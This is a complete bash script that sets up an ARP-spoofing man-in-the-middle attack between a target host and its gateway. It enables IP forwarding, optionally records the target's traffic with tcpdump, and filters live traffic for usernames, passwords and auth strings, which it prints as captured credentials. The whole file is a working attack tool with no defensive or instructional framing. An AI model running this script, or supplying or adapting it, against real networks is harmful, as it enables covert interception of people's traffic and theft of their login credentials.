#!/bin/bash
# arp spoof with traffic capture and credential sniffing

if [ "$EUID" -ne 0 ]; then
    echo "run as root"
    exit 1
fi

show_usage() {
    echo "usage: ./spoof.sh [-i iface] [-c capfile] [-s] <target> <gateway>"
    echo "  -c  capture traffic to pcap"
    echo "  -s  sniff for credentials (http basic auth, ftp, telnet)"
}

get_mac() {
    local ip="$1"
    ping -c 1 -W 1 "$ip" &>/dev/null
    arp -n "$ip" 2>/dev/null | grep "$ip" | awk '{print $3}'
}

get_default_iface() {
    ip route | grep default | head -1 | awk '{print $5}'
}

iface=""
capfile=""
sniff=0
while getopts "i:c:sh" opt; do
    case $opt in
        i) iface="$OPTARG" ;;
        c) capfile="$OPTARG" ;;
        s) sniff=1 ;;
        h) show_usage; exit 0 ;;
        *) show_usage; exit 1 ;;
    esac
done
shift $((OPTIND - 1))

target="$1"
gateway="$2"
[ -z "$target" ] || [ -z "$gateway" ] && { show_usage; exit 1; }
[ -z "$iface" ] && iface=$(get_default_iface)

command -v arpspoof &>/dev/null || { echo "arpspoof not found (install dsniff)"; exit 1; }

echo "resolving..."
target_mac=$(get_mac "$target")
gateway_mac=$(get_mac "$gateway")

[ -z "$target_mac" ] || [ "$target_mac" = "(incomplete)" ] && { echo "cannot reach $target"; exit 1; }
[ -z "$gateway_mac" ] || [ "$gateway_mac" = "(incomplete)" ] && { echo "cannot reach $gateway"; exit 1; }

echo "target:  $target ($target_mac)"
echo "gateway: $gateway ($gateway_mac)"
echo "iface:   $iface"
echo ""

echo 1 > /proc/sys/net/ipv4/ip_forward

pids=()

cleanup() {
    echo ""
    echo "stopping..."
    for p in "${pids[@]}"; do
        kill "$p" 2>/dev/null
    done
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo "restored"
    exit 0
}

trap cleanup INT TERM

if [ -n "$capfile" ]; then
    tcpdump -i "$iface" -w "$capfile" host "$target" &>/dev/null &
    pids+=($!)
fi

if [ $sniff -eq 1 ]; then
    echo "sniffing for credentials..."
    tcpdump -i "$iface" -A -l host "$target" 2>/dev/null | grep -iE '(user|pass|login|auth)' --line-buffered | while read -r line; do
        echo "[cred] $line"
    done &
    pids+=($!)
fi

arpspoof -i "$iface" -t "$target" "$gateway" &>/dev/null &
pids+=($!)
arpspoof -i "$iface" -t "$gateway" "$target" &>/dev/null &
pids+=($!)

echo "spoofing... (ctrl+c to stop)"
wait
